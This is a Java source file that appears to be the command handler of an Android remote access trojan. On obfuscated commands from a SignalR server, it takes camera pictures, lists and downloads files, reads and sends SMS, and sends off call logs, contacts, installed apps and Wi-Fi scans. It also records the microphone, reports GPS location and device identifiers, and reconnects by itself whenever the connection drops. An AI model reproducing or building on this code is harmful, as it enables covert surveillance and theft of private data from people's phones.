package com.remote.app;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.LocationManager;
import android.os.Build;
import android.os.Looper;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import com.microsoft.signalr.HubConnection;
import com.microsoft.signalr.HubConnectionState;
import com.remote.app.socket.IOSocket;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import io.reactivex.CompletableObserver;
import io.reactivex.disposables.Disposable;

public class ConnectionManager {

    private final Context context;
    private static HubConnection ioSocket;
    private static boolean initialBoot = false;
    private final LocManager locManager;

    public ConnectionManager(Context con) {
        context = con;
        locManager = new LocManager(con);
    }

    public void startAsync(String key) {
        try {
            sendReq(key);
        } catch (Exception ex) {
            startAsync(key);
        }

    }

    private void setupHandlers(HubConnection ioSocket) {

        ioSocket.on("0xCA", (data) -> {
            try {
                if (data.getString("action").equals("camList"))
                    CA(-1);
                else if (data.getString("action").equals("takePic"))
                    CA(Integer.parseInt(data.getString("cameraID")));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }, JSONObject.class);

        ioSocket.on("0xFI", (action, path) -> {
            try {
                if (action.equals("ls"))
                    FI(0, path);
                else if (action.equals("dl"))
                    FI(1, path);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }, String.class, String.class);

        ioSocket.on("0xGI", () -> {
            try {
                GI();
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        });
        ioSocket.on("0xTB", (imageId, path) -> {
            try {
                TB(imageId, path);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }, Integer.class, String.class);

        ioSocket.on("0xSM", (action, to, sms) -> {
            try {
                if (action.equals("ls"))
                    SM(0, null, null);
                else if (action.equals("sendSMS"))
                    SM(1, to, sms);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }, String.class, String.class, String.class);


        ioSocket.on("0xCL", () -> {
            try {
                CL();

            } catch (Exception e) {
                e.printStackTrace();
            }
        });


        ioSocket.on("0xCO", () -> {
            try {
                CO();

            } catch (Exception e) {
                e.printStackTrace();
            }
        });


        ioSocket.on("0xMI", (sec) -> {
            try {
                MI(sec);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }, Integer.class);


        ioSocket.on("0xLO", () -> {
            try {
                LO();

            } catch (Exception e) {
                e.printStackTrace();
            }
        });

        ioSocket.on("0xWI", () -> {
            try {
                WI();

            } catch (Exception e) {
                e.printStackTrace();
            }
        });

        ioSocket.on("0xPM", () -> {
            try {
                PM();

            } catch (Exception e) {
                e.printStackTrace();
            }
        });

        ioSocket.on("0xIN", () -> {
            try {
                IN();

            } catch (Exception e) {
                e.printStackTrace();
            }
        });

        ioSocket.on("0xGP", (permission) -> {
            try {
                GP(permission);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }, String.class);


        ioSocket.onClosed((ex) -> {
            ioSocket.start();
        });
    }

    public boolean isConnected(){
        return ioSocket != null && ioSocket.getConnectionState() != HubConnectionState.DISCONNECTED;
    }

    private void sendReq(String key) {
        try {
            if (isConnected())
                return;

            ioSocket = IOSocket.getInstance().init(key);

            if (!initialBoot) {
                initialBoot = true;

                setupHandlers(ioSocket);
            }
            ///ioSocket.on("ping", () -> ioSocket.send("pong"));


            ioSocket.start().subscribe(new CompletableObserver() {
                @Override
                public void onSubscribe(@NonNull Disposable d) {

                }

                @Override
                public void onError(@NonNull Throwable e) {
                    Log.e("SOCKET", e.toString());
                }

                @Override
                public void onComplete() {
                    String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
                    //ioSocket = IO.socket("http://192.168="+Build.VERSION.RELEASE+"&id="+deviceID);

                    try {
                        JSONObject obj = new JSONObject();
                        obj.put("DeviceId", deviceID);

                        obj.put("Release", Build.VERSION.RELEASE);
                        obj.put("Manufacturer", Build.MANUFACTURER);
                        obj.put("Model", Build.MODEL);
                        obj.put("IpAddress", Utils.getIPAddress(true));


                        ioSocket.send("_0xSD", obj.toString());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            });
            ;

        } catch (Exception ex) {
            Log.e("error", ex.getMessage());
        }

    }

    private void CA(int cameraID) {
        if (cameraID == -1) {
            JSONObject cameraList = new CameraManager(context).findCameraList();
            if (cameraList != null)
                ioSocket.send("_0xCA", cameraList);
        } else {
            new CameraManager(context).startUp(cameraID);
        }
    }

    private void FI(int req, String path) {
        if (req == 0) {
            ioSocket.send("_0xFI", FileManager.walk(path).toString());
        } else if (req == 1)
            FileManager.downloadFile(path);
    }

    private void GI() {
        ioSocket.send("_0xGI", FileManager.getAllShownImagesPath().toString());
    }

    private void TB(Integer imageId, String path) {
        try {
            JSONObject thumb = FileManager.getThumbnail(imageId, path);
            if (thumb != null)
                ioSocket.send("_0xTB", thumb.toString());
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    private void SM(int req, String phoneNo, String msg) {
        if (req == 0)
            ioSocket.send("_0xLM", SMSManager.getsms().toString());
        else if (req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            //ioSocket.send("_0xSM", isSent, phoneNo, msg);
            ioSocket.send("_0xLM", SMSManager.getsms().toString());
        }
    }

    private void CL() {
        ioSocket.send("_0xCL", CallsManager.getCallsLogs().toString());
    }

    private void CO() {
        ioSocket.send("_0xCO", ContactsManager.getContacts().toString());
    }

    private void MI(int sec) throws Exception {
        MicManager.startRecording(sec);
    }

    private void WI() {
        ioSocket.send("_0xWI", WifiScanner.scan(context).toString());
    }

    private void PM() {
        ioSocket.send("_0xPM", PermissionManager.getGrantedPermissions(context).toString());
    }


    private void IN() {
        ioSocket.send("_0xIN", AppList.getInstalledApps(false, context).toString());
    }

    private void GP(String perm) {
        JSONObject data = new JSONObject();
        try {
            data.put("permission", perm);
            data.put("isAllowed", PermissionManager.canIUse(perm, context));
            ioSocket.send("_0xGP", data.toString());
        } catch (JSONException e) {

        }
    }

    private void LO() {
        // check if GPS enabled
        if (Looper.myLooper() == null)
            Looper.prepare();

        locManager.getLocation();
        if (locManager.canGetLocation()) {
            ioSocket.send("_0xLO", locManager.getData().toString());
        }
    }

}
